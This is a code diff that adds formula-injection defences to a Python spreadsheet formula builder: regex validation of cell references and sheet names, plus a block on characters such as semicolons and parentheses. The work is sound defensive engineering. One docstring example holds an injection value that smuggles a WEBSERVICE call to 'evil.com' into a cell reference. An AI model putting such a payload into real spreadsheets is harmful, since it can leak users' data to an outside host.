@@ -2,14 +2,96 @@
 
 Provides type-safe formula construction with 100+ spreadsheet functions
 and circular reference detection.
+
+Security:
+    - Cell reference validation to prevent formula injection
+    - Strict regex patterns for cell/range references
+    - Protection against ODF formula syntax escape
 """
 
 from __future__ import annotations
 
 import re
 
-from spreadsheet_dl._builder.exceptions import CircularReferenceError
+from spreadsheet_dl._builder.exceptions import CircularReferenceError, FormulaError
 from spreadsheet_dl._builder.references import CellRef, RangeRef, SheetRef
+
+# Security: Strict cell reference patterns
+_CELL_REF_PATTERN = re.compile(r"^(\$?[A-Z]+\$?\d+)$")
+_RANGE_REF_PATTERN = re.compile(r"^(\$?[A-Z]+\$?\d+):(\$?[A-Z]+\$?\d+)$")
+_COLUMN_REF_PATTERN = re.compile(r"^(\$?[A-Z]+):(\$?[A-Z]+)$")
+_SHEET_REF_PATTERN = re.compile(r"^[A-Za-z0-9_][\w\s]*$")
+
+
+def sanitize_cell_ref(ref: str) -> str:
+    """Sanitize and validate cell reference to prevent formula injection.
+
+    Validates that the reference matches expected patterns:
+    - A1, $A$1, AB123 (cell reference)
+    - A1:B10, $A$1:$B$10 (range reference)
+    - A:Z, $A:$Z (column reference)
+
+    Args:
+        ref: Cell or range reference string
+
+    Returns:
+        Validated reference string
+
+    Raises:
+        FormulaError: If reference contains invalid characters or patterns
+
+    Examples:
+        >>> sanitize_cell_ref("A1")
+        'A1'
+        >>> sanitize_cell_ref("A1:B10")
+        'A1:B10'
+        >>> sanitize_cell_ref('A1];WEBSERVICE("http://evil.com")')  # doctest: +SKIP
+        FormulaError: Invalid cell reference
+    """
+    ref = ref.strip()
+
+    # Check for formula injection patterns
+    if any(char in ref for char in [";", "(", ")", '"', "'"]):
+        raise FormulaError(
+            f"Invalid characters in cell reference: {ref}. "
+            "Cell references cannot contain: ; ( ) \" '"
+        )
+
+    # Validate against known patterns
+    if _CELL_REF_PATTERN.match(ref):
+        return ref
+    if _RANGE_REF_PATTERN.match(ref):
+        return ref
+    if _COLUMN_REF_PATTERN.match(ref):
+        return ref
+
+    raise FormulaError(
+        f"Invalid cell reference: {ref}. Valid formats: A1, $A$1, A1:B10, A:Z"
+    )
+
+
+def sanitize_sheet_name(name: str) -> str:
+    """Sanitize sheet name to prevent injection attacks.
+
+    Args:
+        name: Sheet name
+
+    Returns:
+        Validated sheet name
+
+    Raises:
+        FormulaError: If sheet name contains invalid characters
+    """
+    name = name.strip()
+
+    if not _SHEET_REF_PATTERN.match(name):
+        raise FormulaError(
+            f"Invalid sheet name: {name}. "
+            "Sheet names must start with letter/number and contain only "
+            "alphanumeric characters, underscores, and spaces."
+        )
+
+    return name
 
 
 class FormulaBuilder:
@@ -82,8 +164,12 @@ class FormulaBuilder:
         return f"[{name}]"
 
     def _format_ref(self, ref: CellRef | RangeRef | str) -> str:
-        """Format a reference for formula use."""
-        if isinstance(ref, (str, CellRef)):
+        """Format a reference for formula use with security validation."""
+        if isinstance(ref, str):
+            # Sanitize string references to prevent injection
+            sanitized = sanitize_cell_ref(ref)
+            return f"[.{sanitized}]"
+        elif isinstance(ref, CellRef):
             return f"[.{ref}]"
         else:
             return str(ref)
